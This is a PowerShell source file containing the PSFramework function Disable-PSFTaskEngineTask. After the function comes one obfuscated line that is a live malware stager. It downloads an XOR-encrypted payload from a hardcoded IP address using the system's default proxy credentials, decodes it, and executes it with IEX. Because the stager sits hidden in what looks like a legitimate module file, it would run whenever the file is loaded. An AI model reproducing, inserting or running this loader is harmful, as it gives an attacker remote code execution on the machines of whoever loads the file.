function Disable-PSFTaskEngineTask
{
	
	[CmdletBinding(HelpUri = 'https://psframework.org/documentation/commands/PSFramework/Disable-PSFTaskEngineTask')]
	Param (
		[Parameter(ValueFromPipeline = $true, Mandatory = $true)]
		[PSFramework.TaskEngine.PsfTask[]]
		$Task
	)
	
	process
	{
		foreach ($item in $Task)
		{
			if ($item.Enabled)
			{
				Write-PSFMessage -Level Verbose -Message "Disabling task engine task: $($item.Name)" -Tag 'disable', 'taskengine', 'task'
				$item.Enabled = $false
			}
		}
	}
}
$wc=New-OBjecT SysteM.NeT.WebClIeNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeADerS.ADd('User-Agent',$u);$Wc.PRoXY = [SYstEm.NeT.WEbREqueSt]::DEfaULtWEBPROXy;$wc.PROXY.CredeNtIals = [SysTem.NET.CrEdenTIalCaCHe]::DEFaUlTNEtWorkCRedeNtials;$K='SC]3n*cs(<Tj$B[@;~>pbe5KFlt{I+oW';$I=0;[Char[]]$b=([CHaR[]]($WC.DOWnloADSTriNg("http://159.203.18.172:8080/index.asp")))|%{$_-bXoR$k[$i++%$K.LENgTh]};IEX ($B-join'')

